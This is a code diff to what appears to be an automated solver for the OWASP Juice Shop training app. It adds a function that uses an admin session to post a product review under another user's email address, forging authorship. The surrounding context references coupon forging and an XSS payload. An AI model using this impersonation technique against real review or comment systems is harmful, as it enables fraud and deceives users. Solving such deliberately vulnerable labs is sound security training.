@@ -167,6 +167,21 @@ def _generate_coupon():
     year = now.strftime('%y')
     return z85.encode('{month}{year}-99'.format(month=month, year=year))
 
+def forged_review_challenge(server, session):
+    """
+    Post a product review as another user or edit any user's existing review.
+    :param server: juice shop URL
+    :param session: Session
+    """
+    print('Posting a product review as another user....'),
+    session = get_admin_session(server)
+    payload = json.dumps({"message":"This may be the end of the banana daiquiri as we know it!","author":"bender@juice-sh.op"})
+    review = session.put('{}/rest/products/6/reviews'.format(server), payload)
+    if not review.ok:
+        raise RuntimeError('Error checking out basket.')
+    print('Success.')
+        
+
 
 def solve_product_challenges(server):
     print('\n== PRODUCT CHALLENGES ==\n')
@@ -177,6 +192,7 @@ def solve_product_challenges(server):
     update_osaft_description(server, session)
     #update_product_with_xss3_payload(server, session)
     #forge_coupon(server)
+    forged_review_challenge(server, session)
     print('\n== PRODUCT CHALLENGES COMPLETE ==\n')
 
 if __name__ == '__main__':
